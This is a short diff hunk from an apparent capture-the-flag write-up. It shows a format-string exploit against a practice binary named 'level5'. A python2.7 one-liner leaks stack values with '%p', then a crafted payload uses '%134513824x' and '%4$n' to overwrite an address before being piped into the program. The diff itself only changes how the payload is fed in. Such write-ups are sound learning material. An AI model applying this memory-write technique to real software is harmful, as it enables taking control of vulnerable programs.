@@ -44,7 +44,6 @@ python2.7 -c 'print("\xd0\x83\x04\x08" + " %p"*4)'  | ./level5
 # 134513828 - 4 = 134513824
 
 python2.7 -c 'print("\x38\x98\x04\x08" + "%134513824x" "%4$n")' > /tmp/exploit.txt
-cat /tmp/exploit.txt /dev/stdin | ./level5
 cat /tmp/exploit.txt - | ./level5
 ```
 
